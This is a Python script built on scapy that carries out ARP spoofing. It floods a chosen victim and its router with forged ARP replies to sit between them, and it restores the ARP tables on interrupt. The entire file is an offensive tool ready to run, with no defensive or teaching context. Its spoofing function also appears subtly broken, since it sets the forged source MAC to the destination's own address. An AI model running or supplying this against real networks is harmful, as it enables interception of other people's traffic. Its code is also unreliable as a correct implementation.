#!/usr/bin/env python3
"""
This is a script that performs ARP spoofing on a target machine.
"""

import argparse

from scapy.layers.l2 import ARP, getmacbyip, sendp
from termcolor import *


class ArpSpoofer:
    def __init__(self, victim_ip, router_ip):
        self.victim_ip = victim_ip
        self.router_ip = router_ip
        self.victim_mac = getmacbyip(victim_ip)
        self.router_mac = getmacbyip(router_ip)

    def arp_spoof(self, dest_ip, dest_mac, source_ip):
        packet = ARP(op="is-at", hwsrc=dest_mac, psrc=dest_ip, pdst=source_ip)
        sendp(packet, verbose=False)

    def arp_restore(self, dest_ip, dest_mac, source_ip, source_mac):
        packet = ARP(
            op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip
        )
        sendp(packet, verbose=False)

    def start_spoofing(self):
        print("Sending spoofed ARP packets")
        while True:
            self.arp_spoof(self.victim_ip, self.victim_mac, self.router_ip)
            self.arp_spoof(self.router_ip, self.router_mac, self.victim_ip)

    def stop_spoofing(self):
        print("Restoring ARP Tables")
        self.arp_restore(
            self.router_ip, self.router_mac, self.victim_ip, self.victim_mac
        )
        self.arp_restore(
            self.victim_ip, self.victim_mac, self.router_ip, self.router_mac
        )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument(
        "--victim-ip", help="The IP address of the victim", required=True
    )
    parser.add_argument(
        "--router-ip", help="The IP address of the router", required=True
    )
    args = parser.parse_args()

    try:
        spoofer = ArpSpoofer(args.victim_ip, args.router_ip)
        spoofer.start_spoofing()

    except Exception as e:
        print(colored(e, "red"))

    except KeyboardInterrupt:
        spoofer.stop_spoofing()
        quit()
